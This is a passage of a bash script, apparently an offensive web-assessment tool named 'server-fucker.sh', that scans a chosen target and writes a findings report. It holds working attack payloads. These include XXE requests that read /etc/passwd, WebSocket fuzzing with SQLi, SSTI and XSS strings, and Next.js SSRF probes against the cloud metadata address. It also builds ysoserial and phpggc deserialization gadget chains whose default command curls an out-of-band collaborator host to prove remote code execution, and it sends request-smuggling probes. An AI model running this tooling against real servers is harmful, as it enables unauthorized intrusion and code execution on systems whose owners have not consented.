    grep -noE '(AKIA[0-9A-Z]{16})|(gh[pousr]_[A-Za-z0-9]{20,})|(sk_(live|test)_[0-9a-zA-Z]{16,})|(xox[baprs]-[0-9A-Za-z-]{10,})|(AIza[0-9A-Za-z_-]{35})|(ya29\.[0-9A-Za-z_-]+)|(eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*)|(-----BEGIN [A-Z ]*PRIVATE KEY-----)' "$js" >> "$tmp" 2>/dev/null
    if [ -s "$tmp" ]; then
        sort -u "$tmp" | sed -E 's/(.{160}).*/\1.../' | head -80 >> "$out"
    else
        echo "no hardcoded tokens/keys found in JS bundles" >> "$out"
    fi
    rm -f "$tmp"
}

# ---- favicon hash for Shodan/Censys pivot (find other hosts running same app).
favicon_hash() {
    local out="$OUTDIR/raw/favicon-hash.txt"; : > "$out"
    have python3 || { echo "python3 missing - cannot compute favicon hash" > "$out"; return 0; }
    _curl_auth
    curl -sk -m 8 "${_RETRY[@]}" "${_CA[@]}" -o "$OUTDIR/raw/favicon.ico" "${SCHEME}://${HOST}:${PORT}/favicon.ico" 2>/dev/null
    [ -s "$OUTDIR/raw/favicon.ico" ] || { echo "no favicon served" > "$out"; return 0; }
    python3 - "$OUTDIR/raw/favicon.ico" > "$out" 2>/dev/null <<'PY'
import sys, base64, hashlib
data = open(sys.argv[1], 'rb').read()
try:
    import mmh3
    print("shodan pivot: http.favicon.hash:%d" % mmh3.hash(base64.encodebytes(data)))
except Exception:
    print("(pip install mmh3 for the Shodan favicon hash pivot)")
print("sha256:", hashlib.sha256(data).hexdigest())
PY
}

# ---- rate-limit detection (burst; anti-stealth so caller skips it in stealth).
ratelimit_probe() {
    _curl_auth
    local out="$OUTDIR/raw/ratelimit.txt"; : > "$out"
    local target="$BASEURL" n=30 c429=0 i c
    [ -s "$OUTDIR/raw/api-urls.txt" ] && target=$(head -1 "$OUTDIR/raw/api-urls.txt")
    for i in $(seq 1 "$n"); do
        c=$(curl -sk -m 6 -o /dev/null -w '%{http_code}' "${_CA[@]}" "$target" 2>/dev/null)
        [ "$c" = 429 ] && c429=$((c429+1))
    done
    if [ "$c429" -gt 0 ]; then
        printf 'rate limiting present: %s/%s rapid requests returned HTTP 429 on %s\n' "$c429" "$n" "$target" >> "$out"
    else
        printf 'NO rate limiting: %s rapid requests to %s, zero 429 -> brute-force / credential-stuffing / app-DoS exposure\n' "$n" "$target" >> "$out"
    fi
}

# ---- cookie flags + CSP + security-header audit.
headers_audit() {
    _curl_auth
    local out="$OUTDIR/raw/headers-audit.txt"; : > "$out"
    local hf="$OUTDIR/raw/base-headers.txt"
    curl -sk -m 8 "${_RETRY[@]}" -D "$hf" -o /dev/null "${_CA[@]}" "$BASEURL" 2>/dev/null
    [ -s "$hf" ] || { echo "no response headers" > "$out"; return 0; }
    local line flags csp hdr
    grep -iE '^set-cookie:' "$hf" | tr -d '\r' | while IFS= read -r line; do
        flags=""
        printf '%s' "$line" | grep -qi 'httponly' || flags="$flags HttpOnly"
        printf '%s' "$line" | grep -qi 'secure'   || flags="$flags Secure"
        printf '%s' "$line" | grep -qi 'samesite' || flags="$flags SameSite"
        [ -n "$flags" ] && printf 'COOKIE missing flags:%s -> %.80s\n' "$flags" "$line" >> "$out"
    done
    csp=$(grep -iE '^content-security-policy:' "$hf" | tr -d '\r' | head -1)
    if [ -z "$csp" ]; then printf 'CSP: none (no Content-Security-Policy header)\n' >> "$out"; else
        printf '%s' "$csp" | grep -qi "unsafe-inline" && printf "CSP weak: 'unsafe-inline'\n" >> "$out"
        printf '%s' "$csp" | grep -qi "unsafe-eval"   && printf "CSP weak: 'unsafe-eval'\n" >> "$out"
        printf '%s' "$csp" | grep -qi "default-src"   || printf "CSP weak: no default-src directive\n" >> "$out"
    fi
    for hdr in Strict-Transport-Security X-Content-Type-Options X-Frame-Options Referrer-Policy; do
        grep -qiE "^${hdr}:" "$hf" || printf 'MISSING security header: %s\n' "$hdr" >> "$out"
    done
    grep -qE 'COOKIE missing|CSP weak|CSP: none|MISSING' "$out" 2>/dev/null || echo "cookie flags / CSP / security headers OK" >> "$out"
}

# ---- WebSocket endpoint discovery (101 Switching Protocols handshake).
websocket_probe() {
    _curl_auth
    local out="$OUTDIR/raw/websocket.txt"; : > "$out"
    local cands="$OUTDIR/raw/ws-cands.txt"; : > "$cands"
    grep -aoE 'wss?://[^ "'"'"'<>]+' "$OUTDIR/urls.txt" 2>/dev/null >> "$cands"
    grep -aiE 'websocket' "$OUTDIR/raw/httpx.log" 2>/dev/null | grep -aoE 'https?://[^ "]+' >> "$cands"
    local p
    for p in ws socket socket.io/ graphql cable actioncable live ws/v1; do
        printf '%s://%s:%s/%s\n' "$SCHEME" "$HOST" "$PORT" "$p" >> "$cands"
    done
    sort -u -o "$cands" "$cands"
    local u code i=0
    while IFS= read -r u; do
        [ -z "$u" ] && continue; i=$((i+1)); [ "$i" -gt 30 ] && break
        u="${u/#ws:/http:}"; u="${u/#wss:/https:}"
        _jitter
        code=$(curl -sk -g -m 8 "${_RETRY[@]}" -o /dev/null -w '%{http_code}' \
            -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' \
            -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' "${_CA[@]}" "$u" 2>/dev/null)
        [ "$code" = 101 ] && printf 'WEBSOCKET endpoint (HTTP 101): %s -> test origin/authz on the WS channel manually\n' "$u" >> "$out"
    done < "$cands"
    grep -q WEBSOCKET "$out" 2>/dev/null || echo "no WebSocket (101) endpoints found" >> "$out"
}

# ---- WebSocket message-level fuzzing (RFC6455 client): speaks WS frames, fuzzes
# messages (SSTI/SQLi/XSS/oversized/malformed), tests cross-origin handshake (CSWSH).
websocket_fuzz() {
    local out="$OUTDIR/raw/ws-fuzz.txt"; : > "$out"
    have python3 || { echo "python3 missing - cannot fuzz WebSocket" > "$out"; return 0; }
    grep -q WEBSOCKET "$OUTDIR/raw/websocket.txt" 2>/dev/null || { echo "no live WebSocket endpoints to fuzz" > "$out"; return 0; }
    local eps; eps=$(grep -aoE 'https?://[^ ]+' "$OUTDIR/raw/websocket.txt" | sort -u | head -10)
    local tf="$OUTDIR/raw/ws-targets.txt"; printf '%s\n' "$eps" > "$tf"
    # NOTE: `python3 - <<PY` consumes stdin as the program, so targets are passed via a
    # file argument (argv[3]) rather than piped stdin.
    python3 - "$COOKIE" "$HEADER" "$tf" > "$out" 2>/dev/null <<'PY'
import sys, socket, ssl, base64, os, struct
from urllib.parse import urlparse
cookie = sys.argv[1] if len(sys.argv) > 1 else ""
hdr    = sys.argv[2] if len(sys.argv) > 2 else ""
targets_file = sys.argv[3] if len(sys.argv) > 3 else ""
def ws_connect(url, origin=None):
    p = urlparse(url); host = p.hostname; port = p.port or (443 if p.scheme == 'https' else 80)
    path = p.path or "/"
    try:
        s = socket.create_connection((host, port), timeout=6)
        if p.scheme == 'https':
            s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
    except Exception:
        return None
    key = base64.b64encode(os.urandom(16)).decode()
    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
    if origin: req += f"Origin: {origin}\r\n"
    if cookie: req += f"Cookie: {cookie}\r\n"
    if hdr:    req += hdr + "\r\n"
    req += "\r\n"; s.settimeout(6)
    try:
        s.sendall(req.encode()); resp = s.recv(4096)
    except Exception:
        s.close(); return None
    if b"101" not in resp.split(b"\r\n", 1)[0]:
        s.close(); return None
    return s
def send_txt(s, msg):
    b = msg.encode(); mask = os.urandom(4); h = bytearray([0x81]); ln = len(b)
    if ln < 126: h.append(0x80 | ln)
    elif ln < 65536: h.append(0x80 | 126); h += struct.pack(">H", ln)
    else: h.append(0x80 | 127); h += struct.pack(">Q", ln)
    h += mask; s.sendall(bytes(h) + bytes(bb ^ mask[i % 4] for i, bb in enumerate(b)))
def recv_txt(s):
    try: d = s.recv(65536)
    except Exception: return ""
    if not d or len(d) < 2: return ""
    ln = d[1] & 0x7f; off = 2
    if ln == 126: off = 4
    elif ln == 127: off = 10
    return d[off:off + 4000].decode('utf-8', 'replace')
PAY = [('baseline', '{"msg":"hello"}'), ('ssti', '{"msg":"sf{{7*7}}zz"}'),
       ('sqli', '{"id":"1\' OR \'1\'=\'1"}'), ('xss', '{"msg":"<sfxss>"}'),
       ('malformed', '{"msg":'), ('oversized', '{"msg":"' + 'A' * 20000 + '"}')]
urls = [l.strip() for l in open(targets_file)] if targets_file else []
for url in [u for u in urls if u]:
    s = ws_connect(url, origin="https://evil.sf-probe.example")
    if s:
        print(f"CSWSH: {url} accepted cross-origin handshake (no Origin check) -> cross-site WebSocket hijacking")
        try: s.close()
        except Exception: pass
    s = ws_connect(url)
    if not s:
        print(f"ws-fuzz: {url} handshake failed"); continue
    for name, pl in PAY:
        try:
            send_txt(s, pl); r = recv_txt(s)
        except Exception:
            r = ""
        if 'sf49zz' in r: print(f"WS-SSTI CONFIRMED ({url}) [{name}] -> 7*7 evaluated to 49")
        if any(e in r for e in ('SQL syntax', 'SQLSTATE', 'ORA-', 'syntax error', 'mysql')): print(f"WS-SQL-ERROR ({url}) [{name}]")
        if '<sfxss>' in r: print(f"WS-REFLECTION ({url}) [{name}] -> payload echoed (stored/reflected XSS candidate)")
        if any(e in r for e in ('Traceback', 'Exception', 'at java.', 'stack trace')): print(f"WS-ERROR-LEAK ({url}) [{name}] -> {r[:80]!r}")
    try: s.close()
    except Exception: pass
print("WebSocket message fuzz complete")
PY
    grep -qE 'CONFIRMED|CSWSH|WS-SQL|WS-REFLECTION|WS-ERROR' "$out" 2>/dev/null || echo "no WebSocket message-level findings" >> "$out"
}

# ---- active XXE: XML external entity file read (+ OOB via --collab).
xxe_probe() {
    local eps="$1"
    _curl_auth
    local out="$OUTDIR/raw/xxe.txt"; : > "$out"
    local targets; targets=$( { [ -s "$eps" ] && cat "$eps"; echo "$BASEURL"; } | sort -u | head -n 30 )
    local pl_file='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
    local u body i=0
    while IFS= read -r u; do
        [ -z "$u" ] && continue; i=$((i+1)); [ "$i" -gt 30 ] && break
        _jitter
        body=$(curl -sk -g -m 10 "${_RETRY[@]}" -X POST -H 'Content-Type: application/xml' "${_CA[@]}" --data "$pl_file" "$u" 2>/dev/null)
        printf '%s' "$body" | grep -qE 'root:.*:0:0:' && printf 'XXE CONFIRMED (file:///etc/passwd reflected): %s\n' "$u" >> "$out"
        if [ -n "$COLLAB_HOST" ]; then
            local pl_oob="<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://${COLLAB_HOST}/xxe\">]><r>&xxe;</r>"
            curl -sk -g -m 10 "${_RETRY[@]}" -X POST -H 'Content-Type: application/xml' "${_CA[@]}" --data "$pl_oob" "$u" >/dev/null 2>&1
        fi
    done <<< "$targets"
    [ -n "$COLLAB_HOST" ] && printf 'OOB XXE payloads sent to %s across %s targets (verify collaborator)\n' "$COLLAB_HOST" "$i" >> "$out"
    grep -q 'XXE CONFIRMED' "$out" 2>/dev/null || echo "no XXE confirmed via file reflection" >> "$out"
}

# ---- web stack fingerprint: server/CDN + frontend + backend framework, with
# framework-specific high-value follow-ups. Complements httpx -tech-detect.
fingerprint_stack() {
    _curl_auth
    local out="$OUTDIR/raw/stack.txt"; : > "$out"
    local hf="$OUTDIR/raw/base-headers.txt" bf; bf=$(mktemp 2>/dev/null)
    [ -s "$hf" ] || curl -sk -m 8 "${_RETRY[@]}" -D "$hf" -o /dev/null "${_CA[@]}" "$BASEURL" 2>/dev/null
    curl -sk -g -m 10 "${_RETRY[@]}" "${_CA[@]}" "$BASEURL" -o "$bf" 2>/dev/null
    local H B; H=$(tr -d '\r' < "$hf" 2>/dev/null); B=$(head -c 200000 "$bf" 2>/dev/null)
    add(){ printf '%s\n' "$1" >> "$out"; }
    # infra headers
    printf '%s' "$H" | grep -iE '^server:' | head -1 | sed 's/^[Ss]erver:/server:/' >> "$out"
    printf '%s' "$H" | grep -iE '^(x-powered-by|x-aspnet(mvc)?-version|x-generator|via|x-served-by|x-vercel-id|x-nextjs-cache|x-drupal-cache|x-runtime|x-application-context):' | sed 's/^/header: /' >> "$out"
    printf '%s' "$H" | grep -iE '^set-cookie:' | grep -oiE 'laravel_session|XSRF-TOKEN|csrftoken|_session_id|PHPSESSID|JSESSIONID|connect\.sid|ASP\.NET_SessionId' | sort -u | sed 's/^/cookie-marker: /' >> "$out"
    sig(){ printf '%s\n%s' "$H" "$B" | grep -qiE "$1" && add "detected: $2"; }
    sig '/_next/|__NEXT_DATA__|x-nextjs|next/static'                 'Next.js (React SSR)'
    sig '/_nuxt/|__NUXT__|window\.__NUXT'                            'Nuxt (Vue SSR)'
    sig 'data-reactroot|react-dom|__REACT_DEVTOOLS|_reactListening'  'React'
    sig 'data-v-[0-9a-f]{6,}|__VUE__|vue\.runtime|vue\.min\.js'      'Vue.js'
    sig 'ng-version=|ng-app|_ngcontent|angular\.min\.js'            'Angular'
    sig 'svelte-[0-9a-z]{5,}|__sveltekit|/_app/immutable'           'Svelte / SvelteKit'
    sig 'hx-get|hx-post|hx-swap|hx-target|htmx(\.min)?\.js'         'HTMX'
    sig 'x-data=|x-init=|alpinejs|alpine(\.min)?\.js'              'Alpine.js'
    sig 'jquery[.-][0-9]|jquery(\.min)?\.js'                        'jQuery'
    sig 'wp-content|wp-includes|/wp-json|generator[^>]*WordPress'   'WordPress'
    sig 'Drupal\.settings|/sites/default/|X-Drupal'                'Drupal'
    sig 'X-Runtime|csrf-param|authenticity_token'                   'Ruby on Rails'
    sig 'laravel_session|XSRF-TOKEN|Laravel'                        'Laravel (PHP)'
    sig 'csrftoken|csrfmiddlewaretoken|__admin/|Django'            'Django (Python)'
    sig 'Werkzeug|Flask'                                            'Flask/Werkzeug (Python)'
    sig 'X-Powered-By:[[:space:]]*Express|connect\.sid'            'Express (Node.js)'
    sig 'X-AspNet-Version|__VIEWSTATE|ASP\.NET|\.aspx'             'ASP.NET'
    sig 'X-Application-Context|Whitelabel Error Page|/actuator'    'Spring Boot (Java)'
    sig 'X-Powered-By:[[:space:]]*PHP|PHPSESSID'                   'PHP'
    sig 'cloudflare|__cf_bm|cf-ray'                                 'Cloudflare (CDN/WAF)'
    sig 'x-vercel-id|vercel'                                        'Vercel (hosting)'
    sig 'x-amz-|AmazonS3|awselb|x-amz-cf-id'                        'AWS (S3/CloudFront/ELB)'
    sig '^server:[^\n]*gunicorn'                                    'Gunicorn'
    sig '^server:[^\n]*nginx'                                       'nginx'
    sig '^server:[^\n]*apache'                                      'Apache httpd'
    sig '^server:[^\n]*Microsoft-IIS'                              'IIS'
    rm -f "$bf"
    local b="${SCHEME}://${HOST}:${PORT}"
    # Next.js image-optimizer SSRF surface
    if grep -qi 'Next.js' "$out"; then
        local ic; ic=$(curl -sk -g -m 8 "${_RETRY[@]}" -o /dev/null -w '%{http_code}' "${_CA[@]}" "$b/_next/image?url=http%3A%2F%2F169.254.169.254%2F&w=64&q=75" 2>/dev/null)
        { [ "$ic" = 200 ] || [ "$ic" = 500 ]; } && add "follow-up: Next.js /_next/image reachable (HTTP $ic) -> test image-optimizer SSRF / allowlist bypass"
    fi
    # WordPress REST user enumeration
    if grep -qi 'WordPress' "$out"; then
        curl -sk -g -m 8 "${_RETRY[@]}" "${_CA[@]}" "$b/wp-json/wp/v2/users" 2>/dev/null | grep -qE '"slug"|"name"' \
            && add "follow-up: WordPress /wp-json/wp/v2/users leaks usernames"
    fi
    grep -qiE 'detected:|^server:|^header:' "$out" || echo "no framework fingerprints (heavily obfuscated or static)" >> "$out"
}

# ---- insecure deserialization: passive marker detection + active error triggering.
deser_probe() {
    local params="$1"
    _curl_auth
    local out="$OUTDIR/raw/deser.txt"; : > "$out"
    local blob="$OUTDIR/raw/deser-scan.txt"; : > "$blob"
    [ -s "$OUTDIR/raw/base-headers.txt" ] && cat "$OUTDIR/raw/base-headers.txt" >> "$blob"
    if [ -s "$OUTDIR/urls.txt" ]; then
        head -20 "$OUTDIR/urls.txt" | while read -r u; do _jitter; curl -sk -g -m 6 "${_RETRY[@]}" -D - "${_CA[@]}" "$u" 2>/dev/null; done >> "$blob"
    fi
    # passive: serialized-object markers in cookies/params/responses
    grep -aoE 'rO0AB[A-Za-z0-9+/=]{8,}'  "$blob" | head -3 | sed 's/^/JAVA serialized object (rO0AB...) exposed: /'    >> "$out"
    grep -aqE '__VIEWSTATE'              "$blob" && echo 'ASP.NET __VIEWSTATE present -> test for disabled MAC (ViewState RCE, ysoserial.net)' >> "$out"
    grep -aoE 'O:[0-9]+:"[A-Za-z_][A-Za-z0-9_]*":[0-9]+:\{' "$blob" | head -3 | sed 's/^/PHP serialized object exposed: /' >> "$out"
    grep -aoE 'gASV[A-Za-z0-9+/=]{6,}'   "$blob" | head -2 | sed 's/^/PYTHON pickle (base64 gASV...) exposed: /'       >> "$out"
    grep -aoE 'BAh[A-Za-z0-9+/=]{6,}'    "$blob" | head -2 | sed 's/^/RUBY Marshal (base64 BAg...) exposed: /'         >> "$out"
    # active: send serialized probes, watch for deserialization error signatures
    local targets; targets=$( { [ -s "$params" ] && cat "$params"; echo "$BASEURL"; } | sort -u | head -20 )
    local u body b k t i=0
    while IFS= read -r u; do
        [ -z "$u" ] && continue; i=$((i+1)); [ "$i" -gt 20 ] && break; _jitter
        if printf '%s' "$u" | grep -q '?'; then b="${u%%\?*}"; k="${u#*\?}"; k="${k%%=*}"; t="$b?$k=O%3A8%3A%22stdClass%22%3A0%3A%7B%7D"; else t="${u%/}?data=O%3A8%3A%22stdClass%22%3A0%3A%7B%7D"; fi
        body=$(curl -sk -g -m 8 "${_RETRY[@]}" "${_CA[@]}" "$t" 2>/dev/null)
        printf '%s' "$body" | grep -qiE 'unserialize\(\)|__wakeup|__destruct|allowed classes|Object of class' \
            && printf 'PHP DESERIALIZATION error triggered: %s\n' "$u" >> "$out"
        body=$(curl -sk -g -m 8 "${_RETRY[@]}" "${_CA[@]}" -b 'sf_ser=rO0ABXQABHRlc3Q=' "$u" 2>/dev/null)
        printf '%s' "$body" | grep -qiE 'ObjectInputStream|readObject|ClassNotFoundException|InvalidClassException|resolveClass' \
            && printf 'JAVA DESERIALIZATION error triggered: %s\n' "$u" >> "$out"
    done <<< "$targets"
    grep -qiE 'serialized|VIEWSTATE|DESERIALIZATION|pickle|Marshal' "$out" 2>/dev/null || echo "no serialization markers or deserialization errors found" >> "$out"
}

# ---- gadget-chain exploitation: build Java (ysoserial) / PHP (phpggc) deser gadgets
# that trigger an OOB callback (proof of RCE) and fire them at detected deser sinks.
# HARD-gated: --dos required + (--collab for OOB proof OR --rce-cmd for a custom command).
exploit_deser() {
    local out="$OUTDIR/raw/deser-exploit.txt"; : > "$out"
    if [ "$DOS" != 1 ]; then echo "gadget exploitation skipped (needs --dos)" > "$out"; return 0; fi
    if [ -z "$COLLAB_HOST" ] && [ -z "$RCE_CMD" ]; then
        echo "gadget exploitation skipped (needs --collab for OOB proof, or --rce-cmd for a custom command)" > "$out"; return 0
    fi
    _curl_auth
    local cmd="${RCE_CMD:-curl -s http://${COLLAB_HOST}/rce}"
    local sinks; sinks=$( { grep -aoE 'https?://[^ ]+' "$OUTDIR/raw/deser.txt" 2>/dev/null; \
                            grep -aoE 'https?://[^ ]+' "$OUTDIR/raw/deser-scan.txt" 2>/dev/null; echo "$BASEURL"; } | sort -u | head -15 )
    local nsink; nsink=$(printf '%s\n' "$sinks" | grep -c .)
    printf 'exploitation target sinks: %s | cmd: %s\n' "$nsink" "$cmd" >> "$out"

    # --- Java (ysoserial) ---
    local YSO=""
    have ysoserial && YSO="ysoserial"
    [ -z "$YSO" ] && [ -n "${SF_YSOSERIAL:-}" ] && [ -f "$SF_YSOSERIAL" ] && YSO="java -jar $SF_YSOSERIAL"
    if [ -n "$YSO" ]; then
        local g payl u
        for g in URLDNS CommonsCollections5 CommonsCollections6 CommonsBeanutils1 Groovy1 Hibernate1; do
            if [ "$g" = URLDNS ]; then payl=$($YSO URLDNS "http://${COLLAB_HOST:-127.0.0.1}/urldns-$g" 2>/dev/null | base64 -w0)
            else payl=$($YSO "$g" "$cmd" 2>/dev/null | base64 -w0); fi
            [ -z "$payl" ] && continue
            while IFS= read -r u; do
                [ -z "$u" ] && continue
                curl -sk -g -m 10 "${_RETRY[@]}" "${_CA[@]}" -b "sf_ser=$payl" "$u" >/dev/null 2>&1
                printf '%s' "$payl" | base64 -d 2>/dev/null | curl -sk -g -m 10 "${_RETRY[@]}" "${_CA[@]}" -X POST -H 'Content-Type: application/x-java-serialized-object' --data-binary @- "$u" >/dev/null 2>&1
            done <<< "$sinks"
            printf 'Java gadget %s fired at %s sinks (verify OOB: %s)\n' "$g" "$nsink" "${COLLAB_HOST:-custom-cmd}" >> "$out"
        done
    else
        echo "ysoserial not found (PATH or \$SF_YSOSERIAL) -> install for Java gadget chains (URLDNS/CommonsCollections/...)" >> "$out"
    fi

    # --- PHP (phpggc) ---
    if have phpggc; then
        local c pp u t b k enc
        for c in Monolog/RCE1 Monolog/RCE6 Laravel/RCE1 Guzzle/RCE1 Symfony/RCE4; do
            pp=$(phpggc "$c" system "$cmd" 2>/dev/null); [ -z "$pp" ] && continue
            enc=$(printf '%s' "$pp" | python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.buffer.read()))' 2>/dev/null)
            while IFS= read -r u; do
                [ -z "$u" ] && continue
                if printf '%s' "$u" | grep -q '?'; then b="${u%%\?*}"; k="${u#*\?}"; k="${k%%=*}"; t="$b?$k=$enc"; else t="${u%/}?data=$enc"; fi
                curl -sk -g -m 10 "${_RETRY[@]}" "${_CA[@]}" "$t" >/dev/null 2>&1
                curl -sk -g -m 10 "${_RETRY[@]}" "${_CA[@]}" -b "sf_php=$enc" "$u" >/dev/null 2>&1
            done <<< "$sinks"
            printf 'PHP gadget %s fired (verify OOB: %s)\n' "$c" "${COLLAB_HOST:-custom-cmd}" >> "$out"
        done
    else
        echo "phpggc not found -> install for PHP object-injection gadget chains" >> "$out"
    fi

    printf 'NOTE: live gadget payloads dispatched. Confirm code execution via collaborator hits at %s.\n' "${COLLAB_HOST:-<your listener>}" >> "$out"
    grep -qE 'fired at|gadget .* fired' "$out" 2>/dev/null || echo "no gadget tooling available - exploitation not attempted (detection stands in deser.txt)" >> "$out"
}

# ---- native HTTP request smuggling: CL.TE / TE.CL timing-differential detection.
# Raw sockets (no smuggler binary needed). Intrusive (can desync proxies) -> --dos only.
smuggle_native() {
    local out="$OUTDIR/raw/smuggling.txt"; : > "$out"
    have python3 || { echo "python3 missing - cannot run native smuggling probe" > "$out"; return 0; }
    python3 - "$HOST" "$PORT" "$SCHEME" "$PATHQ" > "$out" 2>/dev/null <<'PY'
import socket, ssl, sys, time
host, port, scheme, path = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
def send(raw, timeout=10):
    try:
        s = socket.create_connection((host, port), timeout=5)
        if scheme == 'https':
            s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
    except Exception:
        return 0.0
    s.settimeout(timeout); t = time.time()
    try:
        s.sendall(raw.encode())
        while True:
            d = s.recv(4096)
            if not d: break
    except Exception:
        pass
    dt = time.time() - t
    try: s.close()
    except Exception: pass
    return dt
base_req = "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % (path, host)
b = min(send(base_req), send(base_req))
clte = ("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n1\r\nA\r\nX" % (path, host))
tecl = ("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nX" % (path, host))
tc = send(clte); te = send(tecl)
print("baseline=%.2fs  CL.TE=%.2fs  TE.CL=%.2fs" % (b, tc, te))
thr = b + 5
if tc > thr and tc >= 8: print("SMUGGLING likely CL.TE (%.1fs delay vs %.1fs baseline) -> confirm with Burp/smuggler" % (tc, b))
if te > thr and te >= 8: print("SMUGGLING likely TE.CL (%.1fs delay vs %.1fs baseline) -> confirm with Burp/smuggler" % (te, b))
if not (tc > thr or te > thr): print("no timing-based smuggling signal (target likely not proxied or not vulnerable)")
PY
}

## ---------------------------------------------------------------- report builder

build_report() {
R="$OUTDIR/raw"
sect()  { printf '\n## %s\n\n' "$1" >> "$REPORT"; }
note()  { printf '%s\n' "$1" >> "$REPORT"; }
code()  { local f="$1" n="${2:-100}"; if [ -s "$f" ]; then printf '```\n' >> "$REPORT"; sed 's/\x1b\[[0-9;]*m//g' "$f" | head -n "$n" >> "$REPORT"; printf '\n```\n' >> "$REPORT"; else note "_no output._"; fi; }
sev_count() { local n; n=$(cat "$R/nuclei.txt" "$R/nuclei-dast.txt" 2>/dev/null | grep -ciE "\[$1\]"); echo "${n:-0}"; }
# count this tool's own actively-verified findings across its raw outputs
own_hits() { grep -rhoiE "$1" "$R/inject-verified.txt" "$R/xxe.txt" "$R/deser.txt" "$R/deser-exploit.txt" "$R/ws-fuzz.txt" "$R/authz.txt" "$R/bypass.txt" "$R/misconfig.txt" "$R/openredirect.txt" "$R/jwt.txt" "$R/sourcemaps.txt" "$R/headers-audit.txt" "$R/ratelimit.txt" "$R/js-secrets.txt" "$R/graphql/result.txt" "$R/smuggling.txt" 2>/dev/null | wc -l | tr -d ' '; }
# count real secret matches in JS (lines look like "N:...") excluding the "none" message
njs_secrets() { local n=0; [ -s "$R/js-secrets.txt" ] && n=$(grep -cE '^[0-9]+:' "$R/js-secrets.txt" 2>/dev/null); echo "${n:-0}"; }

C=$(sev_count critical); H=$(sev_count high); M=$(sev_count medium); L=$(sev_count low); I=$(sev_count info)
NSEC=$(njs_secrets)
OC=$(own_hits 'SSTI CONFIRMED|OS-COMMAND-INJECTION CONFIRMED|PATH-TRAVERSAL CONFIRMED|BLIND-CMDI|XXE CONFIRMED|DESERIALIZATION error|WS-SSTI CONFIRMED|gadget .* fired|SMUGGLING|IDOR CONFIRMED|BROKEN-AUTHZ|alg=none|WEAK HS256 SECRET CRACKED|SSRF CONFIRMED')
OH=$(( $(own_hits 'SQL-ERROR reflected|^BFLA|OBJECT-ENUMERATION|MASS-ASSIGN|BYPASS [0-9]|CORS reflects|CACHE-POISONING risk|query BATCHING|serialized object exposed|__VIEWSTATE present|CSWSH|WS-SQL-ERROR|WS-REFLECTION') + NSEC ))
OM=$(own_hits 'OPEN-REDIRECT|SOURCE-MAP exposed|unkeyed header .* reflected|field-suggestion ENABLED')
OL=$(own_hits 'COOKIE missing flags|CSP weak|CSP: none|MISSING security header|NO rate limiting')
TC=$((C+OC)); TH=$((H+OH)); TM=$((M+OM)); TL=$((L+OL))

{
printf '# Blackbox FULL ASSESSMENT - %s\n\n' "$HOST"
printf '_Generated %s by server-fucker.sh._\n\n' "$(date '+%Y-%m-%d %H:%M')"
printf '**Target:** `%s`  \n' "$BASEURL"
printf '**Auth:** %s  \n' "$([ -n "$COOKIE" ] && echo 'Cookie ')$([ -n "$HEADER" ] && echo 'Header')$([ -n "$COOKIE2$HEADER2" ] && echo ' +2nd-identity')"
printf '**Mode:** %s  \n' "$([ "$STEALTH" = 1 ] && echo 'stealth ')$([ "$DOS" = 1 ] && echo 'dos ')$([ -n "$COLLAB" ] && echo "collab=$COLLAB")"
printf '**Port scan:** %s  \n\n' "$([ "$FULL_PORTS" = 1 ] && echo 'all 65535' || echo 'top 1000')"

printf '## Executive summary\n\n'
printf '| Severity | nuclei | verified (this tool) | total |\n|---|---|---|---|\n'
printf '| Critical | %s | %s | %s |\n' "$C" "$OC" "$TC"
printf '| High | %s | %s | %s |\n' "$H" "$OH" "$TH"
printf '| Medium | %s | %s | %s |\n' "$M" "$OM" "$TM"
printf '| Low | %s | %s | %s |\n' "$L" "$OL" "$TL"
printf '| Info | %s | - | %s |\n' "$I" "$I"
printf '\n_"verified" = actively confirmed by this tool (response-evidence / cross-identity / header analysis), not template matches._\n'
printf '\nRaw tool output is under `raw/`.\n'
} > "$REPORT"

sect "Verified Active Findings"
note "Actively confirmed by this tool via response evidence, cross-identity comparison, or token analysis (higher confidence than template scans)."
_dump_hits() { # file  regex  header
    [ -s "$1" ] || return 0
    if grep -qiE "$2" "$1"; then note "**$3:**"; note '```'; grep -iE "$2" "$1" | sed 's/\x1b\[[0-9;]*m//g' | head -30 >> "$REPORT"; note '```'; fi
}
_dump_hits "$R/inject-verified.txt" 'CONFIRMED|SQL-ERROR reflected' "Injection (SSTI / cmd / traversal / SQLi / SSRF)"
_dump_hits "$R/xxe.txt" 'XXE CONFIRMED' "XML external entity (XXE)"
_dump_hits "$R/deser.txt" 'DESERIALIZATION error|serialized object exposed|__VIEWSTATE present|pickle|Marshal' "Insecure deserialization"
_dump_hits "$R/deser-exploit.txt" 'gadget .* fired' "Deserialization exploitation (gadget chains dispatched — verify OOB)"
_dump_hits "$R/ws-fuzz.txt" 'WS-SSTI CONFIRMED|CSWSH|WS-SQL-ERROR|WS-REFLECTION|WS-ERROR-LEAK' "WebSocket message-level findings"
_dump_hits "$R/smuggling.txt" 'SMUGGLING' "HTTP request smuggling"
_dump_hits "$R/authz.txt" 'IDOR|BFLA|BROKEN-AUTHZ|OBJECT-ENUMERATION|MASS-ASSIGN' "Broken authorization (IDOR / BFLA / mass-assignment)"
_dump_hits "$R/jwt.txt" 'alg=none|WEAK HS256|EXPIRED|authz claims' "JWT weaknesses"
